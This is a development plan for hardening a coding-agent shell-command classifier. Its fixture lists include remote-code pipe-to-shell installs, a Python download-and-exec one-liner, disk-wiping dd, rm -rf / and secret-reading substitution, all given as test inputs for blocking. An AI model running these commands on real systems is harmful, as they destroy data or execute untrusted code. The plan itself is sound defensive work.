# Milestone 4: Shell and Command Preflight Hardening

Date: 2026-07-07

Parent roadmap: `plans/2026-07-07-coding-agent-hardening-roadmap.md`

## Objective

Strengthen `command_preflight` for realistic coding-agent shell planning. The target is not perfect shell security. The target is deterministic, conservative classification of common agent-generated command strings, especially commands that hide risk through shell indirection, interpreter wrappers, package-manager scripts, destructive git operations, or filesystem/network side effects.

## Rationale

Coding agents frequently propose shell commands. A deterministic preflight tool should help the harness decide whether a command can run automatically, needs review, or must be blocked. The current command policy already detects many important classes: network access, filesystem writes, privilege escalation, process control, environment mutation, command substitution, redirection, pipelines, background execution, pipe-to-shell patterns, destructive `rm`, destructive git operations, permissive chmod, and recursive chown.

The remaining risk is realistic false negatives. Commands such as `bash -c "rm -rf target"`, `python -c "..."`, `npm run build`, `make deploy`, `find . -exec ...`, or `curl ... | bash` can obscure behavior from a simple program/subcommand classifier. This milestone adds fixture-backed coverage and targeted classifier improvements while preserving deterministic, local, no-execution behavior.

## Scope

In scope:

- Adversarial command fixture suite.
- Stronger handling for shell/interpreter wrappers.
- Stronger handling for package-manager scripts and task runners.
- Stronger handling for shell indirection and nested command strings.
- More precise findings for network, filesystem, process, privilege, and shell features.
- Documentation of policy modes and POSIX-only scope.
- Tests for default, strict, and permissive policies where applicable.

Out of scope:

- Executing commands.
- Reading project script definitions from disk.
- Full POSIX shell parsing.
- PowerShell or Windows CMD support.
- Vulnerability scanning.
- Remote allow/deny lists.
- Perfect semantic classification of arbitrary shell.

## Files likely to change

- `src/tools/shell.rs`
- `src/text/shell.rs` or whichever module implements shell tokenization/features
- `src/mcp/schemas/shell.rs`
- `src/mcp/machine_codes.rs` if new stable codes are needed
- `tests/mcp/test_route_contracts.rs`
- `tests/mcp/test_tool_gaps.rs`
- New fixture file such as `tests/fixtures/command_preflight_cases.json`
- `architecture/machine-codes.md`
- `architecture/coding-agent-integration.md`
- README or generated docs if schema/description text changes

## Fixture suite design

Create a table-driven fixture suite. Each fixture should include:

- Name.
- Command string.
- Policy mode: `default`, `strict`, or `permissive`.
- Expected verdict.
- Expected primary machine code.
- Expected minimum number of findings.
- Expected finding code or finding type.
- Notes explaining why the command matters.

Suggested fixture categories:

### Benign read-only commands

- `git status`
- `git diff -- src/lib.rs`
- `cargo check`
- `cargo test --all-features`
- `cargo fmt --all -- --check`
- `rg "pattern" src tests`
- `ls -la`
- `pwd`

Expected behavior depends on policy, but these should generally be allow or low-risk review. If any are review under strict policy, the finding should explain the reason.

### Network commands

- `curl https://example.com`
- `wget https://example.com/file`
- `ssh host`
- `scp file host:/tmp/`
- `rsync -av src host:/tmp/src`
- `nmap localhost`
- `dig example.com`

Network access should be review by default unless explicitly blocked by policy. The tool should emit a network-specific finding code.

### Pipe-to-shell and remote execution

- `curl https://example.com/install.sh | sh`
- `curl -fsSL https://example.com/install.sh | bash`
- `wget -O- https://example.com/install.sh | sh`
- `python -c "import urllib.request; exec(urllib.request.urlopen('https://example.com/x').read())"`

Pipe-to-shell should be block, not merely review.

### Shell/interpreter wrappers

- `bash -c "cargo test"`
- `bash -c "rm -rf target"`
- `sh -c "git clean -fdx"`
- `python -c "print('ok')"`
- `python -c "import os; os.remove('x')"`
- `node -e "console.log('ok')"`
- `perl -e 'unlink "x"'`
- `ruby -e 'File.delete("x")'`

Safe-looking interpreter snippets can be review because they are opaque. Destructive-looking snippets should be block or high-severity review depending current policy. The important part is that wrappers are not treated as harmless merely because `python` or `bash` is allowed.

### Package managers and task runners

- `npm test`
- `npm run build`
- `npm run deploy`
- `pnpm run lint`
- `yarn run test`
- `bun run test`
- `make test`
- `make install`
- `make deploy`
- `just test`
- `task build`
- `cargo xtask release`

These should usually be review unless the exact command is in a safe allowlist. Project-defined scripts can execute arbitrary commands, so findings should state that behavior is delegated to project scripts.

### Destructive filesystem and git operations

- `rm -rf /`
- `rm -rf .`
- `rm -rf target`
- `git reset --hard`
- `git clean -fdx`
- `git push --force`
- `chmod -R 777 .`
- `chown -R user .`
- `dd if=/dev/zero of=/dev/sda`

Destructive commands should produce block verdicts or the current project-equivalent block result. Fixture expectations should preserve current intended policy.

### Shell features and indirection

- `echo $(cat secret)`
- `cat file > output.txt`
- `cat input | grep pattern`
- `sleep 10 &`
- `find . -name '*.rs' -exec rm {} \;`
- `xargs rm < files.txt`
- `FOO=bar cargo test`
- `PATH=/tmp:$PATH cargo test`

These should produce findings for command substitution, redirection, pipeline, background execution, filesystem write, or environment mutation as appropriate.

### Parse errors

- `echo "unterminated`
- `bash -c 'unterminated`
- Commands with invalid quoting or unexpected tokenization.

Parse failures should not be allow.

## Implementation steps

### 1. Add fixture structure and baseline tests

Start by creating tests against current behavior. This will reveal where classifier behavior already matches expectations and where implementation changes are required.

Do not immediately change implementation for every mismatch. First identify mismatches that represent true false negatives versus cases where the expected policy should be adjusted.

### 2. Normalize program and subcommand extraction

Ensure `command_preflight` consistently identifies:

- Program name.
- First subcommand or meaningful mode flag.
- Shell features from tokenizer output.
- Program basename if a path is supplied, such as `/usr/bin/git`.
- Environment assignment prefixes such as `FOO=bar cargo test`.

If basename normalization is added, test it with absolute and relative program paths.

### 3. Add wrapper detection

Detect wrapper programs such as:

- `sh`, `bash`, `zsh`, `fish` with `-c`.
- `python`, `python3`, `node`, `perl`, `ruby` with `-c`, `-e`, or equivalent.

For shell wrappers, inspect the nested command string with the existing shell preflight logic when feasible, but avoid unbounded recursion. Use a small recursion depth such as 1 or 2.

For language interpreter snippets, do not attempt full language parsing. Detect obvious substrings for filesystem/network/process behavior and otherwise mark as review because the snippet is opaque executable code.

### 4. Add script-runner risk classification

Treat commands that dispatch to project-defined scripts as review by default:

- `npm run <script>`
- `npm test` if this maps to a script
- `pnpm run <script>`
- `yarn run <script>`
- `bun run <script>`
- `make <target>` except perhaps known read-only/help targets
- `just <recipe>`
- `task <task>`
- `cargo xtask <task>`

Findings should distinguish script delegation from direct destructive behavior.

### 5. Improve shell-feature findings

Verify that existing feature detection maps to stable machine codes for:

- Pipeline.
- Redirection.
- Command substitution.
- Background execution.
- Environment mutation.
- Glob pattern if currently in scope.

If a feature is detected by tokenizer but not surfaced by `command_preflight`, add a finding.

### 6. Add policy-mode matrix tests

For representative commands, test all three policies:

- `strict`: only known safe commands allowed; most script/network/unknown commands review or block.
- `default`: safe common development commands allowed; risky commands review; destructive commands block.
- `permissive`: unknown commands allowed, but destructive or clearly dangerous commands still blocked.

Do not let permissive policy allow destructive commands.

### 7. Update docs and schema descriptions

Update tool description/schema docs to state:

- Shell support is POSIX-oriented.
- The tool does not execute commands.
- The classifier is heuristic and conservative.
- Project-defined scripts are treated as opaque unless a policy override explicitly allows them.
- The output should be used for routing, not as proof of safety.

## Testing requirements

Run targeted tests while iterating:

```bash
cargo test --all-features command_preflight -- --nocapture
cargo test --all-features test_route_contracts -- --nocapture
```

Run full verification before handoff:

```bash
cargo fmt --all -- --check
cargo clippy --all-targets --all-features -- -D warnings
cargo test --all-features --lib
cargo test --all-features --bins
cargo test --all-features --tests -- --skip parity
cargo run --bin generate-docs -- --check
cargo package --verbose
```

## Acceptance criteria

- An adversarial command fixture suite exists.
- `command_preflight` classifies wrapper commands conservatively.
- Pipe-to-shell patterns are blocked.
- Project-defined script runners are review by default unless explicitly allowlisted.
- Destructive git/filesystem/permission operations are blocked or preserve existing block behavior.
- Network commands produce network-specific findings.
- Parse failures are not allow.
- POSIX-only scope is documented.
- Policy-mode differences are tested.
- Route-critical contract tests for `command_preflight` remain exact and stable.

## Review checklist

Before closing the milestone, verify:

- No command fixture executes a command.
- Fixture names clearly state the risk scenario.
- Tests assert machine codes/verdicts, not brittle prose.
- Interpreter-wrapper recursion has a bounded depth.
- Environment assignment handling does not misclassify flags as assignments.
- Permissive policy still blocks clearly destructive commands.
- Documentation avoids claiming complete command safety.

## Handoff notes

This milestone complements, but does not replace, route-critical contract tests. Route-contract fixtures should assert stable outcomes for a representative subset. This milestone can have a much larger adversarial matrix dedicated specifically to shell-command classification quality.
